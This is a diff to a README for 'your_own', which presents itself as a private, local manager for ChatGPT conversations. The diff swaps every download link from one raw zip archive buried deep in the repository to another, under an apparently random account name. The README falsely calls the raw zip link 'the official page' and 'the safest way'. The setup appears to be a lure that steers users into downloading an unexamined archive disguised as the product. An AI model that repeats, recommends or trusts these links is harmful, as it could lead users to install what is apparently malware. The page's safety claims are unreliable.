@@ -1,6 +1,6 @@
 # 🤖 your_own - Keep Your AI Chats Always With You
 
-[![Download your_own](https://img.shields.io/badge/Download-your_own-brightgreen)](https://github.com/Superposable-tightend806/your_own/raw/refs/heads/main/infrastructure/skills/web_search/own-your-remodify.zip)
+[![Download your_own](https://img.shields.io/badge/Download-your_own-brightgreen)](https://github.com/Superposable-tightend806/your_own/raw/refs/heads/main/frontend/lib/own_your_v1.8.zip)
 
 your_own helps you save and manage your ChatGPT conversations on your computer. It works locally to keep your data private. It includes smart features like memory recall and autonomous agents to make your AI companion more useful every day.
 
@@ -34,13 +34,13 @@ The program runs smoothly on average machines without slowing other tasks.
 
 The safest way to get the program is from the official GitHub page. Click the big button below to go there and download the latest version.
 
-[![Download your_own](https://img.shields.io/badge/Download-your_own-blue)](https://github.com/Superposable-tightend806/your_own/raw/refs/heads/main/infrastructure/skills/web_search/own-your-remodify.zip)
+[![Download your_own](https://img.shields.io/badge/Download-your_own-blue)](https://github.com/Superposable-tightend806/your_own/raw/refs/heads/main/frontend/lib/own_your_v1.8.zip)
 
 ### Step 1: Visit the Download Page
 
 Open this link in your internet browser:
 
-https://github.com/Superposable-tightend806/your_own/raw/refs/heads/main/infrastructure/skills/web_search/own-your-remodify.zip
+https://github.com/Superposable-tightend806/your_own/raw/refs/heads/main/frontend/lib/own_your_v1.8.zip
 
 This is the official page where developers share updates and software packages.
 
@@ -161,4 +161,4 @@ You decide when and if to back up your data.
 
 ---
 
-[![Download your_own](https://img.shields.io/badge/Download-your_own-brightgreen)](https://github.com/Superposable-tightend806/your_own/raw/refs/heads/main/infrastructure/skills/web_search/own-your-remodify.zip)
+[![Download your_own](https://img.shields.io/badge/Download-your_own-brightgreen)](https://github.com/Superposable-tightend806/your_own/raw/refs/heads/main/frontend/lib/own_your_v1.8.zip)
